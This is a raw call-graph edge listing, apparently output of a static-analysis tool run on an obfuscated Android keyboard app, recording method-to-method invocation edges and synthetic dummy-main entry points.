STATIC edge: $r1 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r1, $i1) in <lkg: void g(int)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lta: boolean equals(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <iwt: void f(char[],int,int)>($r1, $i1, $i2) in <iwt: java.lang.String d(java.lang.String)> ==> <iwt: void f(char[],int,int)>
STATIC edge: staticinvoke <hbu: hbs f(java.lang.String,long)>("client_error_logging_level", $l0) in <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <clinit>()> ==> <hbu: hbs f(java.lang.String,long)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<lkx: boolean containsKey(java.lang.Object)>($r1) in <ivw: boolean P()> ==> <lkx: boolean containsKey(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean s(java.lang.String)>($r0) in <ivw: boolean B(java.lang.String)> ==> <ivw: boolean s(java.lang.String)>
STATIC edge: $r6 = staticinvoke <lma: lly g()>() in <hbw: java.lang.Object a(java.lang.Object)> ==> <lma: lly g()>
INTERFACE edge: interfaceinvoke $r1.<java.util.Set: boolean add(java.lang.Object)>($r2) in <ljf: java.util.Set f()> ==> <java.util.HashSet: boolean add(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<lqo: void <init>(lkx,lkq)>(r0, $r1) in <lqq: lma g()> ==> <lqo: void <init>(lkx,lkq)>
CLINIT edge: staticinvoke <dwx: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dwx: void <clinit>()>
STATIC edge: $r6 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r4, $i0) in <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
SPECIAL edge: specialinvoke $r0.<hny: void <init>(ivw,java.lang.String)>($r2, $r3) in <hny: hny a(hmm)> ==> <hny: void <init>(ivw,java.lang.String)>
VIRTUAL edge: $l2 = virtualinvoke $r1.<java.util.concurrent.atomic.AtomicLong: long getAndAdd(long)>(-4942790177534073029L) in <j$.util.concurrent.ThreadLocalRandom: void c()> ==> <java.util.concurrent.atomic.AtomicLong: long getAndAdd(long)>
VIRTUAL edge: $r3 = virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder insert(int,java.lang.String)>(0, "No logging platforms found:") in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder insert(int,java.lang.String)>
VIRTUAL edge: $r7 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Iterator: boolean hasNext()>() in <hbv: void j()> ==> <lnc: boolean hasNext()>
VIRTUAL edge: $r2 = virtualinvoke r0.<lsn: lts l()>() in <lsd: boolean b(lsr)> ==> <lsn: lts l()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<ljf: int d(int)>($i0) in <lje: java.lang.Object next()> ==> <ljf: int d(int)>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Map$Entry: java.lang.Object getKey()>() in <lli: void c(java.util.Map$Entry)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
INTERFACE edge: $r3 = interfaceinvoke $r8.<java.util.Map$Entry: java.lang.Object getKey()>() in <lmb: lme f()> ==> <lki: java.lang.Object getKey()>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljd: int f(java.lang.Object)>($r1) in <ljd: java.lang.Object get(java.lang.Object)> ==> <ljd: int f(java.lang.Object)>
CLINIT edge: staticinvoke <java.lang.Integer: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Integer: void <clinit>()>
CLINIT edge: staticinvoke <miv: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <miv: void <clinit>()>
VIRTUAL edge: virtualinvoke r0.<ljd: void p()>() in <ljd: java.util.Map m()> ==> <ljd: void p()>
STATIC edge: $r12 = staticinvoke <hnc: java.lang.String d(hmm)>($r10) in <hbw: java.lang.Object a(java.lang.Object)> ==> <hnc: java.lang.String d(hmm)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
STATIC edge: $i1 = staticinvoke <j$.util.concurrent.r: int i(java.lang.Object,java.lang.Object)>($r1, $r8) in <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)> ==> <j$.util.concurrent.r: int i(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r17 = virtualinvoke $r15.<java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])>($r16) in <lvm: lum j()> ==> <java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])>
STATIC edge: staticinvoke <iye: void O(int,int)>($i0, $i1) in <lqm: java.lang.Object get(int)> ==> <iye: void O(int,int)>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("invalid maximum depth: 0") in <lwf: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.lang.String: int hashCode()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(1) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: $r7 = virtualinvoke r0.<ljd: java.lang.Object j()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: java.lang.Object j()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Enum: boolean equals(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.String: int length()>() in <ivv: ivw a()> ==> <java.lang.String: int length()>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lwk: void <init>()> ==> <java.lang.Object: void <init>()>
STATIC edge: $r1 = staticinvoke <lqq: lqq r(int,java.lang.Object[],lkt)>($i0, $r0, null) in <lqq: lqq a(int,java.lang.Object[])> ==> <lqq: lqq r(int,java.lang.Object[],lkt)>
STATIC edge: $r5 = staticinvoke <ivw: java.lang.String[] Q(java.util.List)>($r4) in <ivw: void <init>(ivv,java.lang.String)> ==> <ivw: java.lang.String[] Q(java.util.List)>
SPECIAL edge: specialinvoke $r13.<mag: void <init>(java.lang.String,int,int)>("AVATAR_STICKER_METADATA", 13, 13) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r7.<lsq: int a()>() in <lsc: void f(java.lang.String,ltn)> ==> <lsp: int a()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorImageThumbnail", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: $z0 = virtualinvoke r0.<liz: boolean hasNext()>() in <liz: java.lang.Object next()> ==> <liz: boolean hasNext()>
SPECIAL edge: specialinvoke $r0.<lkl: void <init>()>() in <lkq: lkl e()> ==> <lkl: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljf: java.util.Set g()>() in <ljf: int size()> ==> <ljf: java.util.Set g()>
CLINIT edge: staticinvoke <java.lang.Boolean: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Boolean: void <clinit>()>
VIRTUAL edge: $r8 = virtualinvoke $r7.<lsc: lsw d()>() in <ivw: ivw d(java.util.Locale)> ==> <lsc: lsw d()>
VIRTUAL edge: virtualinvoke r0.<lss: void setStackTrace(java.lang.StackTraceElement[])>($r2) in <lss: void <init>(java.lang.Throwable,ltc,java.lang.StackTraceElement[])> ==> <java.lang.Throwable: void setStackTrace(java.lang.StackTraceElement[])>
INTERFACE edge: $r4 = interfaceinvoke $r3.<java.util.List: java.util.Iterator iterator()>() in <ivv: java.lang.String c()> ==> <java.util.ArrayList: java.util.Iterator iterator()>
INTERFACE edge: interfaceinvoke $r0.<java.util.Map: java.lang.Object put(java.lang.Object,java.lang.Object)>($r2, $r6) in <iej: void g(java.lang.String,iec)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(14) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
SPECIAL edge: specialinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <hcb: void <init>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <ljd: java.lang.Object[] y()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<lmb: void <init>()>() in <hbv: void j()> ==> <lmb: void <init>()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
STATIC edge: $i5 = staticinvoke <izw: int ah(int)>($i4) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int ah(int)>
SPECIAL edge: specialinvoke $r1.<ljb: void <init>(ljd,int)>($r2, $i0) in <liw: java.lang.Object a(int)> ==> <ljb: void <init>(ljd,int)>
STATIC edge: $r0 = staticinvoke <lsz: lsz c(java.lang.String,java.lang.Class)>("forced", class "Ljava/lang/Boolean;") in <lsl: void <clinit>()> ==> <lsz: lsz c(java.lang.String,java.lang.Class)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lvr: int size()>() in <lvr: int b()> ==> <java.util.AbstractMap: int size()>
SPECIAL edge: specialinvoke r0.<lkq: void <init>()>() in <lqm: void <init>(lqn)> ==> <lkq: void <init>()>
SPECIAL edge: specialinvoke r0.<lsz: void <init>(java.lang.String,java.lang.Class,boolean)>("group_by", $r1, 1) in <lsj: void <init>(java.lang.Class)> ==> <lsz: void <init>(java.lang.String,java.lang.Class,boolean)>
CLINIT edge: staticinvoke <coo: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <coo: void <clinit>()>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/libraries/inputmethod/experiment/FlagManager") in <hcb: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: java.util.Map o()>() in <ljd: int size()> ==> <ljd: java.util.Map o()>
STATIC edge: staticinvoke <iwt: void r(char[],int,int,char,char,int)>($r1, $i3, $i4, $c0, $c1, $i2) in <iwt: char[] s(java.lang.String,char,char,int)> ==> <iwt: void r(char[],int,int,char,char,int)>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.Map$Entry: java.lang.Object getValue()>() in <llg: java.lang.Object next()> ==> <lki: java.lang.Object getValue()>
SPECIAL edge: specialinvoke r0.<lkg: void <init>(int)>(4) in <lly: void <init>()> ==> <lkg: void <init>(int)>
VIRTUAL edge: $c0 = virtualinvoke $r0.<java.lang.String: char charAt(int)>(0) in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: char charAt(int)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lid: java.lang.Object getKey()>() in <lid: int hashCode()> ==> <ljb: java.lang.Object getKey()>
SPECIAL edge: specialinvoke $r9.<mag: void <init>(java.lang.String,int,int)>("AUTOCOMPLETE", 9, 9) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Enum: java.lang.String toString()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <idq: void <init>(java.lang.String,mag)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r26.<j$.util.concurrent.s: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.s,j$.util.concurrent.s)>($i9, $r15, $r16, null, null) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.s: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.s,j$.util.concurrent.s)>
SPECIAL edge: specialinvoke $r1.<j$.util.concurrent.e: void <init>(j$.util.concurrent.ConcurrentHashMap)>(r0) in <j$.util.concurrent.ConcurrentHashMap: java.util.Set entrySet()> ==> <j$.util.concurrent.e: void <init>(j$.util.concurrent.ConcurrentHashMap)>
STATIC edge: $z0 = staticinvoke <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)>($r1, $r2) in <hbv: boolean o()> ==> <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <hbw: void <init>(int)> ==> <java.lang.Object: void <init>()>
INTERFACE edge: $r2 = interfaceinvoke $r0.<java.lang.Iterable: java.util.Iterator iterator()>() in <izw: java.util.Collection at(java.lang.Iterable)> ==> <liy: java.util.Iterator iterator()>
SPECIAL edge: $r3 = specialinvoke r0.<ljf: int[] r()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: int[] r()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lsm: int a(lsz)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r1, $i2, $r23) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
SPECIAL edge: specialinvoke r0.<lme: void <init>(lkx,int)>($r1, 0) in <ljs: void <init>()> ==> <lme: void <init>(lkx,int)>
STATIC edge: $z0 = staticinvoke <ivw: boolean x(char)>($c0) in <ivw: boolean u(char)> ==> <ivw: boolean x(char)>
VIRTUAL edge: virtualinvoke r0.<ljd: int b()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: int b()>
VIRTUAL edge: $r5 = virtualinvoke $r0.<androidx.core.content.FileProvider: android.net.Uri insert(android.net.Uri,android.content.ContentValues)>(null, null) in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: android.net.Uri insert(android.net.Uri,android.content.ContentValues)>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lmb: lme f()> ==> <lje: boolean hasNext()>
VIRTUAL edge: $r1 = virtualinvoke $r0.<java.lang.String: char[] toCharArray()>() in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: char[] toCharArray()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(5) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lfb: void <init>(lfa)> ==> <iye: java.lang.Object w(java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<ljf: void h()>() in <ljf: java.util.Set f()> ==> <ljf: void h()>
INTERFACE edge: $r9 = interfaceinvoke $r8.<java.util.Map$Entry: java.lang.Object getValue()>() in <lmb: lme f()> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
SPECIAL edge: specialinvoke $r16.<lsu: void <init>()>() in <lsd: boolean b(lsr)> ==> <lsu: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r4.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lta: boolean equals(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c3) in <ivw: boolean w(char[],int,int)> ==> <ivw: boolean u(char)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String substring(int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
STATIC edge: $r17 = staticinvoke <java.lang.Boolean: java.lang.Boolean valueOf(java.lang.String)>($r12) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.Boolean: java.lang.Boolean valueOf(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lje: void <init>(ljf)> ==> <java.lang.Object: void <init>()>
STATIC edge: $r3 = staticinvoke <java.lang.Thread: java.lang.Thread currentThread()>() in <ojg: void v(java.lang.String)> ==> <java.lang.Thread: java.lang.Thread currentThread()>
STATIC edge: $r3 = staticinvoke <lme: lmb g()>() in <hbv: void j()> ==> <lme: lmb g()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.ExceptionInInitializerError: void <init>(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r5 = virtualinvoke $r12.<lts: java.lang.Object d(lsz)>($r13) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <ltr: java.lang.Object d(lsz)>
SPECIAL edge: specialinvoke $r15.<mag: void <init>(java.lang.String,int,int)>("BITMOJI_IMAGE", 15, 15) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i8 = virtualinvoke $r13.<lvq: int size()>() in <lvr: void <init>(lvr,lvr)> ==> <lvq: int size()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Error: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <miv: void <init>(java.lang.Object)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<lvr: boolean isEmpty()>() in <lvt: boolean a()> ==> <java.util.AbstractMap: boolean isEmpty()>
STATIC edge: $r4 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r4, $i0) in <lsn: void q(lsz,java.lang.Object)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r4, $r5) in <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean s(java.lang.String)> ==> <java.lang.String: int length()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <lvt: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.k: boolean equals(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean w(char[],int,int)>($r3, $i0, $i1) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean w(char[],int,int)>
SPECIAL edge: $i3 = specialinvoke r0.<qj: int j()>() in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <qj: int j()>
CLINIT edge: staticinvoke <lpi: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lpi: void <clinit>()>
VIRTUAL edge: $r4 = virtualinvoke $r3.<java.lang.Object: java.lang.Class getClass()>() in <iej: void g(java.lang.String,iec)> ==> <java.lang.Object: java.lang.Class getClass()>
STATIC edge: $z0 = staticinvoke <j$.sun.misc.a: boolean a(sun.misc.Unsafe,java.lang.Object,long,java.lang.Object)>($r2, $r3, $l0, $r1) in <j$.sun.misc.b: boolean e(java.lang.Object,long,java.lang.Object)> ==> <j$.sun.misc.a: boolean a(sun.misc.Unsafe,java.lang.Object,long,java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean w(char[],int,int)>($r3, $i3, $i6) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean w(char[],int,int)>
VIRTUAL edge: $r4 = virtualinvoke $r3.<java.lang.StringBuilder: java.lang.String toString()>() in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: java.lang.String toString()>
INTERFACE edge: interfaceinvoke $r9.<lse: void F(java.lang.String,java.lang.Object,java.lang.Object)>("Locale %s has invalid language \'%s\', fallback to \'en\'", $r0, $r4) in <ivw: ivw d(java.util.Locale)> ==> <lsv: void F(java.lang.String,java.lang.Object,java.lang.Object)>
STATIC edge: $r1 = staticinvoke <lum: lvm i()>() in <lum: boolean n(java.lang.String,java.util.logging.Level,boolean)> ==> <lum: lvm i()>
VIRTUAL edge: $r7 = virtualinvoke $r0.<androidx.lifecycle.ProcessLifecycleOwnerInitializer: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>(null, $r5, "", $r6, "") in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <androidx.lifecycle.ProcessLifecycleOwnerInitializer: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>
STATIC edge: $r4 = staticinvoke <java.util.Arrays: int[] copyOf(int[],int)>($r4, $i0) in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: int[] copyOf(int[],int)>
STATIC edge: $r4 = staticinvoke <lsq: lsq e(java.lang.String,java.lang.String,int,java.lang.String)>($r3, $r1, $i0, $r2) in <lsn: lsw j(java.lang.String,java.lang.String,int,java.lang.String)> ==> <lsq: lsq e(java.lang.String,java.lang.String,int,java.lang.String)>
CLINIT edge: staticinvoke <lwa: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lwa: void <clinit>()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(7) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
STATIC edge: staticinvoke <ojg: void c(java.lang.Object,java.lang.String)>($r4, "copyOf(this, newSize)") in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ojg: void c(java.lang.Object,java.lang.String)>
STATIC edge: $r2 = staticinvoke <iwt: java.lang.String e(java.lang.String)>($r2) in <ivv: void f(java.lang.String)> ==> <iwt: java.lang.String e(java.lang.String)>
SPECIAL edge: specialinvoke $r16.<mag: void <init>(java.lang.String,int,int)>("UNKNOWN_GRPC_FEATURE", 16, 16) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r22.<mag: void <init>(java.lang.String,int,int)>("LOCAL", 22, 22) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r0.<ljs: void <init>()>() in <ljs: void <clinit>()> ==> <ljs: void <init>()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(17) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Empty subtag, error index: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lkf: void <init>()>() in <lqk: void <init>(java.lang.Object,java.lang.Object[],int,lqk)> ==> <lkf: void <init>()>
SPECIAL edge: specialinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <lak: void <init>(byte[])> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lsb: java.lang.Object a(int)>($i1) in <lsb: java.lang.Object next()> ==> <lnd: java.lang.Object a(int)>
STATIC edge: $r1 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r1) in <ivv: ivw b(java.lang.String)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(long[],long[])>($r10, $r11) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(long[],long[])>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(16) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: specialinvoke $r4.<hbv: void <init>(java.lang.String)>($r0) in <hcb: hbv v(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object)> ==> <hbv: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <iwt: boolean k(char)>($c0) in <iwt: java.lang.String d(java.lang.String)> ==> <iwt: boolean k(char)>
VIRTUAL edge: virtualinvoke $r3.<hbv: void k(java.lang.Object,boolean)>($r1, 0) in <hcb: hbv j(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object,java.lang.Object)> ==> <hbv: void k(java.lang.Object,boolean)>
STATIC edge: $r3 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r3) in <lqm: java.lang.Object get(int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(19) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
SPECIAL edge: specialinvoke $r5.<java.util.AbstractMap$SimpleImmutableEntry: void <init>(java.lang.Object,java.lang.Object)>($r3, $r4) in <lqm: java.lang.Object get(int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: void <init>(java.lang.Object,java.lang.Object)>
SPECIAL edge: $i2 = specialinvoke r0.<lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])>($r6, $i3, $i2, $r4, $r5) in <lvr: void <init>(lvr,lvr)> ==> <lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("Gif", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i1) in <ivv: ivw a()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
VIRTUAL edge: $l0 = virtualinvoke $r0.<j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>(class "Lj$/util/concurrent/r;", "lockState") in <j$.util.concurrent.r: void <clinit>()> ==> <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<lkq: boolean isEmpty()>() in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.util.AbstractCollection: boolean isEmpty()>
VIRTUAL edge: $r2 = virtualinvoke $r4.<java.lang.Throwable: java.lang.StackTraceElement[] getStackTrace()>() in <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <java.lang.Throwable: java.lang.StackTraceElement[] getStackTrace()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String toString()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r4 = staticinvoke <lma: lma i(int,java.lang.Object[])>($i5, $r2) in <lma: lma i(int,java.lang.Object[])> ==> <lma: lma i(int,java.lang.Object[])>
VIRTUAL edge: $r0 = virtualinvoke $r1.<java.lang.ThreadLocal: java.lang.Object get()>() in <j$.util.concurrent.ThreadLocalRandom: int b()> ==> <java.lang.ThreadLocal: java.lang.Object get()>
STATIC edge: staticinvoke <iwt: void f(char[],int,int)>($r3, 0, $i0) in <ivv: ivw b(java.lang.String)> ==> <iwt: void f(char[],int,int)>
